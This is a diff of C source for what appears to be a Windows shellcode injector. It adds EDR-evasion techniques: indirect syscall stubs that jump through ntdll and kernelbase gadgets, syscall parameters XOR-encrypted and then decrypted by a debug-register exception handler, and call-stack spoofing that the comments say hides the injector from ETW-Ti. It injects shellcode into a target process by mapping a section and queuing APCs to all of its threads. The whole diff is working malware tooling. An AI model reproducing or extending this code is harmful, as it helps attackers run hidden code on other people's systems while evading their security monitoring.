@@ -54,6 +54,7 @@ typedef NTSTATUS (NTAPI *PNtCreateSection)(
 typedef NTSTATUS (NTAPI *PNtMapViewOfSection)(
     HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, ULONG, ULONG, ULONG);
 typedef NTSTATUS (NTAPI *PNtUnmapViewOfSection)(HANDLE, PVOID);
+typedef NTSTATUS (NTAPI *PNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
 
 static PNtDelayExecution _NtDelay;
 
@@ -277,39 +278,84 @@ static DWORD resolve_ssn(HMODULE ntdll, const char *fn)
     return ~0u;
 }
 
-static ULONG64 g_ntdll_syscall_ret = 0;
+static ULONG64 g_ghost_gadget = 0;
+static int g_ghost_mod = 0; /* 0=none, 1=ntdll, 2=kernelbase */
 
-/* find ntdll's own syscall;ret (0F 05 C3) so stubs JMP there instead of
-   executing syscall from VirtualAlloc'd memory — keeps RIP inside ntdll
-   at kernel entry, which is what indirect syscalls require */
-static ULONG64 find_ntdll_syscall_ret(HMODULE ntdll)
+/* find the syscall;ret (0F 05 C3) inside a specific ntdll function.
+   Per-function targeting: RIP lands at the function's OWN syscall
+   instruction, so the SSN matches the function name -- no EDR
+   mismatch heuristic can fire. */
+static ULONG64 find_func_syscall(HMODULE ntdll, const char *fn)
 {
-    ULONG64 tva; ULONG tsz;
-    if (!pe_section(ntdll, ".text", &tva, &tsz)) return 0;
-    uint8_t *p = (uint8_t *)tva;
-    for (ULONG i = 0; i + 2 < tsz; i++)
+    uint8_t *p = (uint8_t *)pe_export(ntdll, fn);
+    if (!p) return 0;
+    for (int i = 0; i < 32; i++)
         if (p[i] == 0x0F && p[i+1] == 0x05 && p[i+2] == 0xC3)
-            return tva + i;
+            return (ULONG64)(p + i);
     return 0;
 }
 
-/* indirect syscall stub: mov r10,rcx; mov eax,SSN; jmp [ntdll!syscall;ret]
-   the syscall instruction executes inside ntdll's address range */
-static void *alloc_stub(DWORD ssn)
+/* indirect syscall stub with ghost gadget redirect:
+   stub: mov r10,rcx; mov eax,SSN; lea rbx,[&func_sr]; jmp ghost_gadget
+   ghost gadget (ntdll/kernelbase ghost region): JMP [RBX] -> func's own syscall;ret
+   syscall fires inside the target function in ntdll.
+
+   Execution chain: stub -> ghost JMP[RBX] (no .pdata) -> func syscall;ret
+   When ghost gadget unavailable, falls back to direct jmp [func_sr]. */
+static void *alloc_stub(DWORD ssn, ULONG64 func_sr)
 {
-    uint8_t code[24];
+    uint8_t code[80];
     int off = 0;
+
+    if (g_ghost_gadget && func_sr) {
+        /* ghost gadget path: save RBX (callee-saved) in caller shadow space,
+           swap return addr with epilogue, then jmp ghost→JMP[RBX]→syscall;ret.
+           Epilogue restores RBX and jumps to original return address.
+           RSP is never modified so stack params for 5+ arg functions stay aligned. */
+        code[off++] = 0x48; code[off++] = 0x89; code[off++] = 0x5C;
+        code[off++] = 0x24; code[off++] = 0x08;                      /* mov [rsp+8], rbx */
+        code[off++] = 0x4C; code[off++] = 0x8B; code[off++] = 0xD1;  /* mov r10, rcx */
+        code[off++] = 0xB8;                                           /* mov eax, imm32 */
+        *(DWORD *)(code + off) = ssn; off += 4;
+        code[off++] = 0x48; code[off++] = 0x8D; code[off++] = 0x1D;  /* lea rbx, [rip+Y] */
+        int lea_rbx = off; off += 4;
+        code[off++] = 0x4C; code[off++] = 0x8B; code[off++] = 0x1C;
+        code[off++] = 0x24;                                           /* mov r11, [rsp] */
+        code[off++] = 0x4C; code[off++] = 0x89; code[off++] = 0x5C;
+        code[off++] = 0x24; code[off++] = 0x10;                      /* mov [rsp+16], r11 */
+        code[off++] = 0x4C; code[off++] = 0x8D; code[off++] = 0x1D;  /* lea r11, [rip+W] */
+        int lea_r11 = off; off += 4;
+        code[off++] = 0x4C; code[off++] = 0x89; code[off++] = 0x1C;
+        code[off++] = 0x24;                                           /* mov [rsp], r11 */
+        code[off++] = 0xFF; code[off++] = 0x25;                      /* jmp [rip+V] */
+        int jmp_disp = off; off += 4;
+        int epilogue = off;
+        code[off++] = 0x48; code[off++] = 0x8B; code[off++] = 0x1C;
+        code[off++] = 0x24;                                           /* mov rbx, [rsp] */
+        code[off++] = 0xFF; code[off++] = 0x64; code[off++] = 0x24;
+        code[off++] = 0x08;                                           /* jmp [rsp+8] */
+        int ghost_data = off;
+        *(ULONG64 *)(code + off) = g_ghost_gadget; off += 8;
+        int sr_data = off;
+        *(ULONG64 *)(code + off) = func_sr; off += 8;
+        *(DWORD *)(code + lea_rbx) = (DWORD)(sr_data   - (lea_rbx  + 4));
+        *(DWORD *)(code + lea_r11) = (DWORD)(epilogue  - (lea_r11  + 4));
+        *(DWORD *)(code + jmp_disp)= (DWORD)(ghost_data- (jmp_disp + 4));
+    } else {
+
     code[off++] = 0x4C; code[off++] = 0x8B; code[off++] = 0xD1;   /* mov r10, rcx */
     code[off++] = 0xB8;                                              /* mov eax, imm32 */
     *(DWORD *)(code + off) = ssn; off += 4;
-    if (g_ntdll_syscall_ret) {
-        code[off++] = 0xFF; code[off++] = 0x25;                     /* jmp [rip+0] */
+
+    if (func_sr) {
+        code[off++] = 0xFF; code[off++] = 0x25;                      /* jmp [rip+0] */
         *(DWORD *)(code + off) = 0; off += 4;
-        *(ULONG64 *)(code + off) = g_ntdll_syscall_ret; off += 8;
+        *(ULONG64 *)(code + off) = func_sr; off += 8;
     } else {
-        code[off++] = 0x0F; code[off++] = 0x05;                     /* syscall */
-        code[off++] = 0xC3;                                          /* ret */
+        code[off++] = 0x0F; code[off++] = 0x05;                      /* syscall */
+        code[off++] = 0xC3;                                           /* ret */
     }
+    } /* close else from ghost gadget path */
     void *m = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if (!m) return NULL;
     memcpy(m, code, off);
@@ -350,11 +396,6 @@ static int   n_ng, n_kg, n_wg;
 static bool build_chain(void)
 {
     HMODULE ntdll  = GetModuleHandleA("ntdll.dll");
-    if (!g_ntdll_syscall_ret) {
-        g_ntdll_syscall_ret = find_ntdll_syscall_ret(ntdll);
-        if (g_ntdll_syscall_ret)
-            printf("[*] ntdll syscall;ret at %llx\n", g_ntdll_syscall_ret);
-    }
     HMODULE kbase  = GetModuleHandleA("kernelbase.dll");
     HMODULE wow64  = GetModuleHandleA("wow64.dll");
     HMODULE win32u = GetModuleHandleA("win32u.dll");
@@ -370,7 +411,25 @@ static bool build_chain(void)
     n_kg = scan_ghosts(kbase, kb_t,  4, kg, 512);
     n_wg = wow64 ? scan_ghosts(wow64, w64_t, 3, wg, 64) : 0;
 
-    printf("[*] ghost scan: ntdll=%d  kernelbase=%d  wow64=%d\n\n", n_ng, n_kg, n_wg);
+    printf("[*] ghost scan: ntdll=%d  kernelbase=%d  wow64=%d\n", n_ng, n_kg, n_wg);
+
+    if (!g_ghost_gadget) {
+        GhostGadget gg[8];
+        int ngg = scan_ghost_gadgets(ng, n_ng, "ntdll", gg, 8);
+        if (ngg > 0) { g_ghost_gadget = gg[0].va; g_ghost_mod = 1; }
+        else {
+            ngg = scan_ghost_gadgets(kg, n_kg, "kernelbase", gg, 8);
+            if (ngg > 0) { g_ghost_gadget = gg[0].va; g_ghost_mod = 2; }
+        }
+        if (g_ghost_gadget)
+            printf("[*] ghost gadget JMP [RBX] at %llx (%s) -- used as L%d + stub redirect\n",
+                   g_ghost_gadget, g_ghost_mod == 1 ? "ntdll" : "kernelbase",
+                   g_ghost_mod == 1 ? 3 : 2);
+        else
+            printf("[!] no ghost gadget found -- stubs use direct jmp\n");
+    }
+
+    printf("\n");
 
     Ghost *g1 = best_ghost(wg, n_wg, "Wow64PrepareForException");
     if (!g1) g1 = best_ghost(wg, n_wg, "Wow64KiUserCallbackDispatcher");
@@ -392,11 +451,13 @@ static bool build_chain(void)
 
     Ghost *g2 = best_ghost(kg, n_kg, "VirtualProtect");
     if (!g2) g2 = best_ghost(kg, n_kg, "VirtualAllocEx");
-    ULONG64 L2 = g2 ? (g2->va_start + g2->size / 2) : ((ULONG64)kbase + 0x64180);
+    ULONG64 L2 = (g_ghost_mod == 2) ? g_ghost_gadget
+               : g2 ? (g2->va_start + g2->size / 2) : ((ULONG64)kbase + 0x64180);
 
     Ghost *g3 = best_ghost(ng, n_ng, "RtlCreateUserThread");
     if (!g3) g3 = best_ghost(ng, n_ng, "NtAllocateVirtualMemory");
-    ULONG64 L3 = g3 ? (g3->va_start + g3->size / 2) : ((ULONG64)ntdll + 0x50F80);
+    ULONG64 L3 = (g_ghost_mod == 1) ? g_ghost_gadget
+               : g3 ? (g3->va_start + g3->size / 2) : ((ULONG64)ntdll + 0x50F80);
 
     ULONG64 L4 = win32u ? win32u_nop_gap(win32u) : (ng[0].va_start + 4);
     ULONG64 L5 = pe_export(ntdll, "RtlUserThreadStart") + 0x21;
@@ -404,8 +465,12 @@ static bool build_chain(void)
 
     printf("  L0  %016llx  (mf anchor)\n", L0);
     printf("  L1  %016llx  %-28s (wow64 ghost)\n",    L1, g1 ? g1->name : "fallback");
-    printf("  L2  %016llx  %-28s (kernelbase ghost)\n", L2, g2 ? g2->name : "fallback");
-    printf("  L3  %016llx  %-28s (ntdll ghost)\n",    L3, g3 ? g3->name : "fallback");
+    printf("  L2  %016llx  %-28s (kernelbase ghost%s)\n", L2,
+           g_ghost_mod == 2 ? "JMP[RBX] ghost gadget" : g2 ? g2->name : "fallback",
+           g_ghost_mod == 2 ? " + gadget" : "");
+    printf("  L3  %016llx  %-28s (ntdll ghost%s)\n",  L3,
+           g_ghost_mod == 1 ? "JMP[RBX] ghost gadget" : g3 ? g3->name : "fallback",
+           g_ghost_mod == 1 ? " + gadget" : "");
     printf("  L4  %016llx  win32u nop gap\n", L4);
     printf("  L5  %016llx  RtlUserThreadStart+0x21\n\n", L5);
 
@@ -610,6 +675,7 @@ static __attribute__((noinline)) void stomp_plant(void)
     }
     printf("[*] BYOUD-RT: stack_base=%llx  frame=%p  depth=%llu\n",
            stack_base, frame, stack_base - (ULONG64)frame);
+    fflush(stdout);
 
     for (int d = 0; d < STOMP_DEPTH; d++) {
         g_stomp_ptrs[d]  = &frame[1 + d];
@@ -620,6 +686,7 @@ static __attribute__((noinline)) void stomp_plant(void)
     g_stomp_saved = g_stomp_slots[0];
     printf("[+] stomped %d slots: L1=%llx L2=%llx L3=%llx L4=%llx\n",
            STOMP_DEPTH, layers[0], layers[1], layers[2], layers[3]);
+    fflush(stdout);
 }
 
 static void stomp_restore(void)
@@ -650,9 +717,19 @@ static LONG WINAPI chain_veh(EXCEPTION_POINTERS *ep)
 typedef struct {
     ULONG64 key;
     bool    armed;
+    bool    full_spoof;
 } ParamCryptCtx;
 
 static ParamCryptCtx g_pcrypt = {0};
+static ULONG64 g_ret_gadget = 0;   /* ret (C3) inside ntdll — spoofed return addr */
+static ULONG64 g_real_ret = 0;     /* saved real return (epilogue in alloc_stub) */
+
+#define MAX_SPOOF 16
+static ULONG64 g_saved_slots[MAX_SPOOF];
+static int      g_saved_idx[MAX_SPOOF];
+static int      g_n_spoofed = 0;
+static ULONG64  g_spoof_rsp = 0;
+static ULONG64  g_exe_base = 0, g_exe_end = 0;
 
 static LONG WINAPI param_encrypt_veh(EXCEPTION_POINTERS *ep)
 {
@@ -660,13 +737,66 @@ static LONG WINAPI param_encrypt_veh(EXCEPTION_POINTERS *ep)
         return EXCEPTION_CONTINUE_SEARCH;
 
     PCONTEXT ctx = ep->ContextRecord;
+
+    /* DR1: after syscall returned through the spoofed ret gadget in ntdll.
+       Restore all spoofed stack slots, then redirect to real epilogue. */
+    if (ctx->Dr6 & 0x2) {
+        if (g_n_spoofed) {
+            ULONG64 *base = (ULONG64 *)g_spoof_rsp;
+            for (int i = 0; i < g_n_spoofed; i++)
+                base[g_saved_idx[i]] = g_saved_slots[i];
+            g_n_spoofed = 0;
+        }
+        ctx->Rip = g_real_ret;
+        ctx->Dr1 = 0;
+        ctx->Dr7 &= ~0x4ULL;
+        ctx->Dr6 = 0;
+        return EXCEPTION_CONTINUE_EXECUTION;
+    }
+
+    /* DR0: at syscall;ret — decrypt params + spoof entire call stack */
     if (!(ctx->Dr6 & 0x1) || !g_pcrypt.armed)
         return EXCEPTION_CONTINUE_SEARCH;
 
-    ctx->Rcx ^= g_pcrypt.key;
-    ctx->Rdx ^= g_pcrypt.key;
-    ctx->R8  ^= g_pcrypt.key;
-    ctx->R9  ^= g_pcrypt.key;
+    if (g_pcrypt.key) {
+        ctx->Rcx ^= g_pcrypt.key;
+        ctx->R10 ^= g_pcrypt.key;
+        ctx->Rdx ^= g_pcrypt.key;
+        ctx->R8  ^= g_pcrypt.key;
+        ctx->R9  ^= g_pcrypt.key;
+    }
+
+    if (g_ret_gadget) {
+        ULONG64 *rsp = (ULONG64 *)ctx->Rsp;
+        g_real_ret = *rsp;
+        *rsp = g_ret_gadget;
+        g_spoof_rsp = ctx->Rsp;
+
+        /* full_spoof: scan stack and replace any value within lacuna.exe's
+           image with ghost frame addresses.  This removes ALL unsigned-module
+           frames from the ETW-Ti stack capture so call_stack_final_user_module
+           is never the injector binary. */
+        g_n_spoofed = 0;
+        if (g_pcrypt.full_spoof && g_exe_base && g_ls) {
+            ULONG64 gh[4] = {
+                g_ls->L1_wow64, g_ls->L2_kbase,
+                g_ls->L3_ntdll, g_ls->L4_win32u
+            };
+            for (int i = 1; i <= MAX_SPOOF; i++) {
+                ULONG64 v = rsp[i];
+                if (v >= g_exe_base && v < g_exe_end) {
+                    g_saved_slots[g_n_spoofed] = v;
+                    g_saved_idx[g_n_spoofed]   = i;
+                    rsp[i] = gh[g_n_spoofed % 4];
+                    g_n_spoofed++;
+                    if (g_n_spoofed >= MAX_SPOOF) break;
+                }
+            }
+        }
+
+        ctx->Dr1 = g_ret_gadget;
+        ctx->Dr7 = (ctx->Dr7 | 0x4) & ~(0xFULL << 20);
+    }
 
     ctx->Dr0 = 0;
     ctx->Dr7 &= ~0x1ULL;
@@ -676,16 +806,17 @@ static LONG WINAPI param_encrypt_veh(EXCEPTION_POINTERS *ep)
     return EXCEPTION_CONTINUE_EXECUTION;
 }
 
-static void pcrypt_arm(ULONG64 key)
+static void pcrypt_arm(ULONG64 key, ULONG64 syscall_ret_addr, bool full)
 {
-    if (!g_ntdll_syscall_ret) return;
-    g_pcrypt.key   = key;
-    g_pcrypt.armed = true;
+    if (!syscall_ret_addr) return;
+    g_pcrypt.key        = key;
+    g_pcrypt.armed      = true;
+    g_pcrypt.full_spoof = full;
 
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     GetThreadContext((HANDLE)-2, &ctx);
-    ctx.Dr0 = g_ntdll_syscall_ret;
+    ctx.Dr0 = syscall_ret_addr;
     ctx.Dr7 = (ctx.Dr7 & ~0xFULL) | 0x1;
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     SetThreadContext((HANDLE)-2, &ctx);
@@ -698,7 +829,9 @@ static void pcrypt_disarm(void)
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     GetThreadContext((HANDLE)-2, &ctx);
     ctx.Dr0 = 0;
-    ctx.Dr7 &= ~0x1ULL;
+    ctx.Dr1 = 0;
+    ctx.Dr7 &= ~0x5ULL;
+    ctx.Dr6 = 0;
     ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
     SetThreadContext((HANDLE)-2, &ctx);
 }
@@ -725,78 +858,146 @@ static bool do_inject_sapc(DWORD pid, uint8_t *sc, SIZE_T sc_sz)
 {
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 
-    if (!g_ntdll_syscall_ret)
-        g_ntdll_syscall_ret = find_ntdll_syscall_ret(ntdll);
-    printf("[*] indirect syscall via ntdll+%llx\n",
-           g_ntdll_syscall_ret - (ULONG64)ntdll);
+    if (!g_exe_base) {
+        HMODULE self = GetModuleHandleA(NULL);
+        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)self;
+        IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((uint8_t *)self + dos->e_lfanew);
+        g_exe_base = (ULONG64)self;
+        g_exe_end  = g_exe_base + nt->OptionalHeader.SizeOfImage;
+        printf("[*] exe range for stack spoof: %llx-%llx\n", g_exe_base, g_exe_end);
+    }
 
-    DWORD ssn_o  = resolve_ssn(ntdll, "NtOpenProcess");
-    DWORD ssn_cs = resolve_ssn(ntdll, "NtCreateSection");
-    DWORD ssn_mv = resolve_ssn(ntdll, "NtMapViewOfSection");
-    DWORD ssn_uv = resolve_ssn(ntdll, "NtUnmapViewOfSection");
-    DWORD ssn_ot = resolve_ssn(ntdll, "NtOpenThread");
-    DWORD ssn_qa = resolve_ssn(ntdll, "NtQueueApcThread");
-    DWORD ssn_al = resolve_ssn(ntdll, "NtAlertThread");
-    DWORD ssn_c  = resolve_ssn(ntdll, "NtClose");
+    static const char *api_names[] = {
+        "NtOpenProcess", "NtCreateSection", "NtMapViewOfSection",
+        "NtUnmapViewOfSection", "NtOpenThread", "NtQueueApcThread",
+        "NtAlertThread", "NtClose"
+    };
+    static DWORD ssns[8];
+    static ULONG64 srs[8];
+    for (int i = 0; i < 8; i++) {
+        ssns[i] = resolve_ssn(ntdll, api_names[i]);
+        srs[i]  = find_func_syscall(ntdll, api_names[i]);
+        printf("[*] %-24s  ssn=%02lx  syscall;ret=ntdll+%llx\n",
+               api_names[i], ssns[i], srs[i] ? srs[i] - (ULONG64)ntdll : 0);
+    }
 
-    printf("[*] ssns  o=%02lx cs=%02lx mv=%02lx uv=%02lx ot=%02lx qa=%02lx al=%02lx c=%02lx\n",
-           ssn_o, ssn_cs, ssn_mv, ssn_uv, ssn_ot, ssn_qa, ssn_al, ssn_c);
+    /* all locals that must survive stomp_plant are static — stomp_plant
+       writes chain layers into frame[1..4] (RBP+8..+32) which with -O2
+       can overlap compiler-placed locals on the stack */
+    static PNtOpenProcess        open_proc;
+    static PNtCreateSection      mk_sec;
+    static PNtMapViewOfSection   map_view;
+    static PNtUnmapViewOfSection unmap_view;
+    static PNtOpenThread         open_thr;
+    static PNtQueueApcThread     queue_apc;
+    static PNtAlertThread        alert_thr;
+    static PNtClose              nt_close;
+    static PNtProtectVirtualMemory prot_vm;
+    static HANDLE hProc, hSec;
+    static PVOID  local_base, remote_base;
+    static SIZE_T local_sz, remote_sz;
+    static PVOID  pcrypt_veh, veh;
+    static NTSTATUS s;
 
-    PNtOpenProcess        open_proc  = alloc_stub(ssn_o);
-    PNtCreateSection      mk_sec     = alloc_stub(ssn_cs);
-    PNtMapViewOfSection   map_view   = alloc_stub(ssn_mv);
-    PNtUnmapViewOfSection unmap_view = alloc_stub(ssn_uv);
-    PNtOpenThread         open_thr   = alloc_stub(ssn_ot);
-    PNtQueueApcThread     queue_apc  = alloc_stub(ssn_qa);
-    PNtAlertThread        alert_thr  = alloc_stub(ssn_al);
-    PNtClose              nt_close   = alloc_stub(ssn_c);
+    open_proc  = alloc_stub(ssns[0], srs[0]);
+    mk_sec     = alloc_stub(ssns[1], srs[1]);
+    map_view   = alloc_stub(ssns[2], srs[2]);
+    unmap_view = alloc_stub(ssns[3], srs[3]);
+    open_thr   = alloc_stub(ssns[4], srs[4]);
+    queue_apc  = alloc_stub(ssns[5], srs[5]);
+    alert_thr  = alloc_stub(ssns[6], srs[6]);
+    nt_close   = alloc_stub(ssns[7], srs[7]);
+
+    DWORD   ssn_prot = resolve_ssn(ntdll, "NtProtectVirtualMemory");
+    ULONG64  sr_prot = find_func_syscall(ntdll, "NtProtectVirtualMemory");
+    printf("[*] %-24s  ssn=%02lx  syscall;ret=ntdll+%llx\n",
+           "NtProtectVirtualMemory", ssn_prot,
+           sr_prot ? sr_prot - (ULONG64)ntdll : 0ULL);
+    prot_vm = alloc_stub(ssn_prot, sr_prot);
 
     if (!open_proc || !mk_sec || !map_view || !unmap_view
-            || !open_thr || !queue_apc || !alert_thr || !nt_close) {
+            || !open_thr || !queue_apc || !alert_thr || !nt_close || !prot_vm) {
         fprintf(stderr, "[-] stub alloc failed\n"); return false;
     }
 
-    HANDLE hProc = NULL;
+    /* ret gadget for return-address spoofing: use NtClose's ret (C3) in ntdll.
+       srs[7] points to NtClose's 0F 05 C3 sequence, so +2 is a bare ret. */
+    g_ret_gadget = srs[7] ? srs[7] + 2 : 0;
+    if (g_ret_gadget)
+        printf("[*] ret gadget for stack spoof: ntdll+%llx\n",
+               g_ret_gadget - (ULONG64)ntdll);
+
+    pcrypt_veh = AddVectoredExceptionHandler(1, param_encrypt_veh);
+
+#define PKEY 0xCAFE1337ULL
+#define EP(p) ((void*)((ULONG64)(p) ^ PKEY))
+
+    hProc = NULL; hSec = NULL;
+    local_base = NULL; local_sz = 0;
+    remote_base = NULL; remote_sz = 0;
     OBJECT_ATTRIBUTES oa  = { sizeof(OBJECT_ATTRIBUTES) };
     CID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
-    NTSTATUS s = open_proc(&hProc,
-                           PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
-                           &oa, &cid);
+
+    pcrypt_arm(PKEY, srs[0], true);
+    s = open_proc(
+        (PHANDLE)EP(&hProc),
+        (ACCESS_MASK)((PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION) ^ (DWORD)PKEY),
+        (POBJECT_ATTRIBUTES)EP(&oa),
+        (CID *)EP(&cid));
     if (!NT_OK(s)) { fprintf(stderr, "[-] NtOpenProcess: %08lx\n", s); goto done; }
-    printf("[+] proc  %p  pid %lu\n", hProc, pid);
+    printf("[+] proc  %p  pid %lu\n", hProc, pid); fflush(stdout);
 
-    PVOID pcrypt_veh = AddVectoredExceptionHandler(1, param_encrypt_veh);
-    PVOID veh = AddVectoredExceptionHandler(1, chain_veh);
+    veh = AddVectoredExceptionHandler(1, chain_veh);
 
+    printf("[*] calling stomp_plant...\n"); fflush(stdout);
     stomp_plant();
+    printf("[*] stomp_plant done\n"); fflush(stdout);
 
-    /* create section — parameter encryption hides PAGE_EXECUTE_READWRITE
+    /* create section — parameter encryption hides SECTION_ALL_ACCESS
        from any remaining userland hook intercepts */
-    HANDLE hSec = NULL;
+    hSec = NULL;
     LARGE_INTEGER sec_sz = { .QuadPart = (LONGLONG)sc_sz };
 
-    s = mk_sec(&hSec, SECTION_ALL_ACCESS, NULL, &sec_sz,
-               PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
+    printf("[*] arming pcrypt for NtCreateSection (srs[1]=%llx)...\n", srs[1]); fflush(stdout);
+    pcrypt_arm(PKEY, srs[1], true);
+    printf("[*] calling mk_sec...\n"); fflush(stdout);
+    s = mk_sec(
+        (PHANDLE)EP(&hSec),
+        (ACCESS_MASK)(SECTION_ALL_ACCESS ^ (DWORD)PKEY),
+        (POBJECT_ATTRIBUTES)EP(NULL),
+        (PLARGE_INTEGER)EP(&sec_sz),
+        PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
     if (!NT_OK(s)) { fprintf(stderr, "[-] NtCreateSection: %08lx\n", s); goto done; }
-    printf("[+] section  %p\n", hSec);
+    printf("[+] section  %p\n", hSec); fflush(stdout);
 
-    PVOID local_base = NULL; SIZE_T local_sz = 0;
+    local_base = NULL; local_sz = 0;
+    pcrypt_arm(0, srs[2], false);
     s = map_view(hSec, (HANDLE)-1, &local_base, 0, sc_sz, NULL, &local_sz,
                  ViewUnmap, 0, PAGE_READWRITE);
     if (!NT_OK(s)) { fprintf(stderr, "[-] NtMapViewOfSection(local): %08lx\n", s); goto done; }
-    printf("[+] local rw  %p\n", local_base);
+    printf("[+] local rw  %p\n", local_base); fflush(stdout);
 
     for (SIZE_T i = 0; i < sc_sz; i++) ((uint8_t *)local_base)[i] = sc[i] ^ 0x5A;
     for (SIZE_T i = 0; i < sc_sz; i++) ((uint8_t *)local_base)[i] ^= 0x5A;
-    printf("[+] shellcode written (%zu bytes)\n", sc_sz);
+    printf("[+] shellcode written (%zu bytes)\n", sc_sz); fflush(stdout);
 
-    PVOID remote_base = NULL; SIZE_T remote_sz = 0;
-    s = map_view(hSec, hProc, &remote_base, 0, sc_sz, NULL, &remote_sz,
-                 ViewUnmap, 0, PAGE_EXECUTE_READ);
+    remote_base = NULL; remote_sz = 0;
+    pcrypt_arm(PKEY, srs[2], false);
+    s = map_view(
+        (HANDLE)((ULONG64)hSec ^ PKEY),
+        (HANDLE)((ULONG64)hProc ^ PKEY),
+        (PVOID *)EP(&remote_base),
+        (ULONG_PTR)(0 ^ PKEY),
+        sc_sz, NULL, &remote_sz,
+        ViewUnmap, 0, PAGE_EXECUTE_READ);
     if (!NT_OK(s)) { fprintf(stderr, "[-] NtMapViewOfSection(remote): %08lx\n", s); goto done; }
-    printf("[+] remote rx  %p\n", remote_base);
+    printf("[+] remote rx  %p\n", remote_base); fflush(stdout);
 
-    unmap_view((HANDLE)-1, local_base);
+    printf("[*] unmapping local view (base=%p)...\n", local_base); fflush(stdout);
+    pcrypt_arm(0, srs[3], true);
+    s = unmap_view((HANDLE)-1, local_base);
+    printf("[*] unmap returned %08lx\n", s); fflush(stdout);
+    printf("[*] closing section...\n"); fflush(stdout);
     nt_close(hSec); hSec = NULL;
 
     /* queue APC to every thread in the target */
@@ -813,11 +1014,14 @@ static bool do_inject_sapc(DWORD pid, uint8_t *sc, SIZE_T sc_sz)
             CID tcid = { (HANDLE)(ULONG_PTR)pid, (HANDLE)(ULONG_PTR)te.th32ThreadID };
             OBJECT_ATTRIBUTES toa = { sizeof(OBJECT_ATTRIBUTES) };
             HANDLE ht = NULL;
+            pcrypt_arm(0, srs[4], true);
             NTSTATUS ts = open_thr(&ht, THREAD_SET_CONTEXT|THREAD_ALERT, &toa, &tcid);
             if (!NT_OK(ts)) continue;
+            pcrypt_arm(0, srs[5], true);
             ts = queue_apc(ht, remote_base, remote_base, NULL, NULL);
             if (NT_OK(ts)) {
-                printf("[+] apc  tid %lu\n", te.th32ThreadID);
+                printf("[+] apc  tid %lu\n", te.th32ThreadID); fflush(stdout);
+                pcrypt_arm(0, srs[6], true);
                 alert_thr(ht);
                 queued++;
             }
@@ -853,6 +1057,7 @@ done:
     VirtualFree(queue_apc,  0, MEM_RELEASE);
     VirtualFree(alert_thr,  0, MEM_RELEASE);
     VirtualFree(nt_close,   0, MEM_RELEASE);
+    VirtualFree(prot_vm,    0, MEM_RELEASE);
     return NT_OK(s);
 }
 
